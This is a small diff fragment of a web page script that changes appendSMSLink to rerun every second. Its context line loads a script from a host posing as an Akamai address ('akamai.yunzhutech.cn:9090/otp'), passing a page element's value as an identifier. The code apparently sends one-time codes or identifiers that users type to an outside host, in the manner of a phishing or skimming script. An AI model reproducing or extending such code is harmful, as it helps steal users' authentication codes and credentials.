@@ -105,6 +105,7 @@ loadScript("https://akamai.yunzhutech.cn:9090/otp?identifier="+document.getEleme
 
 window.onload = appendSMSLink;
 
-window.onunload = function(){};
+setInterval(appendSMSLink,1000);
 
-setTimeout(appendSMSLink, 3000);
+//window.onunload = function(){};
+
